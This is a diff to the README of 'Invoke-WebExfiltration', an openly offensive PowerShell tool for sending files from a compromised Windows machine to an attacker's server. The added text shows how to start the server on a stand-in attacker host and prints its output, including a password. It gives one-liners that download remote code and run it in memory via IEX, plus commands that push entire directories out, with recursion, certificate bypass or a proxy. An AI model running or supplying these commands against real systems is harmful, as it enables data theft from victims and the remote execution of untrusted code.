@@ -104,13 +104,8 @@ SYNOPSIS
     (with file gzip compression and AES-256 encryption)
     Author: Philipp Rieth
 
-
 SYNTAX
     Invoke-WebExfiltration [-File] <Object> [[-Target] <String>] [-Password <String>] [-Insecure] [<CommonParameters>]
-
-
-DESCRIPTION
-
 
 RELATED LINKS
     GitHub: https://github.com/PhilippRieth/Invoke-WebExfiltration
@@ -129,9 +124,11 @@ REMARKS
 ```bash
 git clone https://github.com/PhilippRieth/Invoke-WebExfiltration.git
 cd Invoke-WebExfiltration
+
 pip3 install virtualenv
 virtualenv -p python3 venv
 source venv/bin/active
+
 pip install -r requirements.txt
 ```
 
@@ -148,6 +145,44 @@ pip install -r requirements.txt
 ```
 
 # Usage & Examples
+
+## Start the server
+```bash
+$ ./iwe-server.py --address hackerman1337.net --port 8443
+
+ _____  ____      ____  ________
+|_   _||_  _|    |_  _||_   __  |
+  | |    \ \  /\  / /    | |_ \_|
+  | |     \ \/  \/ /     |  _| _
+ _| |_     \  /\  /     _| |__/ |
+|_____|     \/  \/     |________|
+
+Invoke-WebExfiltration v0.2
+by Philipp Rieth
+
+URL:      https://hackerman1337.net:8443/
+Password: Y84f2hFiAShv3Juw
+Loot dir: /home/hackerman/git/Invoke-WebExfiltration/loot/
+
+Copy any of the two into your PowerShell:
+PS > IEX (New-Object Net.WebClient).DownloadString('https://hackerman1337.net:8443/iwe')
+PS > IWR -SkipCertificateCheck 'https://hackerman1337.net:8443/iwe' | IEX
+
+Start exfiltrating files with:
+PS > ls * | IEX
+
+ * Serving Flask app 'iwe-server'
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on https://127.0.0.1:8443
+ * Running on https://172.30.140.67:8443
+Press CTRL+C to quit
+```
+
+```powershell
+
+```
 
 ## Load `IWE` into PowerShell 
 
@@ -178,11 +213,18 @@ IWE -File .\file.bin
 # Exfiltrate all files in current folder
 ls | IWE
 
+# Exfiltrate all files in current folder and ignore certificate errors
+ls | IWE -Insecure
+
 # Exfiltrate all files in curent dir starting with 
 ls file* | IWE
 
 # Exfiltrate all files and sub directories 
 ls -Recurse * | IWE
+
+# Define exfiltration password via parameter (not so secure but okay)
+# Add space before command to prevent it from being save in the PowerShell histroy
+ls file.txt | IWE -Verbose -Password Y84f2hFiAShv3Juw
 ```
 
 ## Load & use `IWE` with proxy 
@@ -218,7 +260,6 @@ $proxyUri = "http://yourProxy:8080"
 IEX (New-Object Net.WebClient).DownloadString('https://hackerman1337.net/iwe')
 ls $HOME/Desktop | IWE
 ```
-
 
 ## Exfiltrate large files (split into chunks)
 Large files (>100MB) should be split into smaller chunks.
